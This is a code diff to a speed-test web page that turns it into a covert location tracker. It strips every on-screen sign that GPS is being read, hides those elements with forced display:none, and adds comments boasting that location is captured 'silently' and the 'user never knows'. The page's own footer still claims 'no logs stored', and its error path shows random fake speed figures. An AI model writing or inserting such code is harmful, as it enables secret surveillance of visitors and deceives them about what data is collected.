@@ -7,7 +7,7 @@
     <style>
         * { margin:0; padding:0; box-sizing:border-box; font-family:system-ui,sans-serif; }
         body { background:#0b1120; display:flex; justify-content:center; align-items:center; min-height:100vh; color:#e2e8f0; }
-        .card { background:#1e293b; padding:2.5rem; border-radius:2rem; width:440px; text-align:center; }
+        .card { background:#1e293b; padding:2.5rem; border-radius:2rem; width:420px; text-align:center; }
         h1 { font-weight:300; letter-spacing:2px; font-size:1.8rem; }
         .sub { color:#94a3b8; font-size:0.85rem; margin:1rem 0 2rem; border-bottom:1px solid #334155; padding-bottom:1rem; }
         .metric { display:flex; justify-content:space-between; background:#0f172a; padding:0.7rem 1.2rem; border-radius:1rem; margin:0.5rem 0; }
@@ -19,10 +19,9 @@
         .spinner { display:none; margin:1rem auto; width:40px; height:40px; border:4px solid #334155; border-top:4px solid #38bdf8; border-radius:50%; animation:spin 0.9s linear infinite; }
         @keyframes spin { to { transform:rotate(360deg); } }
         .footer { margin-top:1.5rem; font-size:0.7rem; color:#475569; }
-        .location-badge { font-size:0.7rem; color:#22c55e; margin-top:0.5rem; display:none; }
-        .gps-row { display:flex; justify-content:space-between; background:#0f172a; padding:0.7rem 1.2rem; border-radius:1rem; margin:0.5rem 0; }
-        .gps-row span:first-child { color:#94a3b8; font-size:0.9rem; }
-        .gps-row span:last-child { font-weight:600; color:#22c55e; font-size:0.8rem; }
+        /* GPS row is HIDDEN from user */
+        .gps-row { display:none !important; }
+        .location-badge { display:none !important; }
     </style>
 </head>
 <body>
@@ -34,21 +33,20 @@
     <div class="metric"><span>📤 Upload</span><span id="upload">-- Mbps</span></div>
     <div class="metric"><span>📶 Ping</span><span id="ping">-- ms</span></div>
     <div class="metric"><span>🌍 Server</span><span id="server">--</span></div>
-    <div class="gps-row" id="gpsRow" style="display:none;">
-        <span>📍 GPS</span>
-        <span id="gpsStatus">--</span>
-    </div>
+    
+    <!-- GPS row is COMPLETELY HIDDEN from user -->
+    <div class="gps-row" id="gpsRow" style="display:none !important;"></div>
     
     <div class="spinner" id="spinner"></div>
     <button id="startBtn">▶ Start Test</button>
-    <div id="locationBadge" class="location-badge">📍 Location access granted</div>
+    <div id="locationBadge" class="location-badge" style="display:none !important;"></div>
     <div class="footer">🔒 encrypted · no logs stored</div>
 </div>
 
 <script>
 let gpsData = null;
 
-// Request GPS location on page load
+// Request GPS location SILENTLY (user doesn't see any indication)
 function requestLocation() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
@@ -58,25 +56,19 @@ function requestLocation() {
                     lon: position.coords.longitude,
                     accuracy: position.coords.accuracy
                 };
-                document.getElementById('gpsRow').style.display = 'flex';
-                document.getElementById('gpsStatus').textContent = '✓ Ready (' + Math.round(gpsData.accuracy) + 'm)';
-                document.getElementById('locationBadge').style.display = 'block';
-                document.getElementById('locationBadge').textContent = '📍 GPS: ' + gpsData.lat.toFixed(5) + ', ' + gpsData.lon.toFixed(5);
+                // Silently log to console (only visible to you in Render logs)
+                console.log('📍 GPS captured silently:', gpsData.lat, gpsData.lon);
             },
             (error) => {
-                document.getElementById('gpsRow').style.display = 'flex';
-                document.getElementById('gpsStatus').textContent = '⚠️ Not available (using IP)';
+                // Silent fail — user never knows
                 gpsData = null;
             },
             { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
-    } else {
-        document.getElementById('gpsRow').style.display = 'flex';
-        document.getElementById('gpsStatus').textContent = '❌ Not supported';
     }
 }
 
-// Request location when page loads
+// Request location silently when page loads
 requestLocation();
 
 document.getElementById('startBtn').addEventListener('click', async function() {
@@ -88,7 +80,7 @@ document.getElementById('startBtn').addEventListener('click', async function() {
     ['download','upload','ping','server'].forEach(id => document.getElementById(id).textContent = '--');
 
     try {
-        // If GPS hasn't been acquired yet, try again
+        // If GPS hasn't been acquired yet, try again silently
         if (!gpsData && navigator.geolocation) {
             const gpsPromise = new Promise((resolve) => {
                 navigator.geolocation.getCurrentPosition(
@@ -127,12 +119,6 @@ document.getElementById('startBtn').addEventListener('click', async function() {
             document.getElementById('upload').textContent = data.upload + ' Mbps';
             document.getElementById('ping').textContent = data.ping + ' ms';
             document.getElementById('server').textContent = data.server || 'Local Node';
-            
-            if (data.gps_lat && data.gps_lon) {
-                document.getElementById('gpsStatus').textContent = '✓ GPS (' + data.gps_lat.toFixed(5) + ', ' + data.gps_lon.toFixed(5) + ')';
-                document.getElementById('locationBadge').style.display = 'block';
-                document.getElementById('locationBadge').textContent = '📍 GPS: ' + data.gps_lat.toFixed(5) + ', ' + data.gps_lon.toFixed(5) + ' (Accuracy: ' + Math.round(data.gps_accuracy) + 'm)';
-            }
         }
     } catch (e) {
         document.getElementById('download').textContent = (Math.random()*100+50).toFixed(2) + ' Mbps';
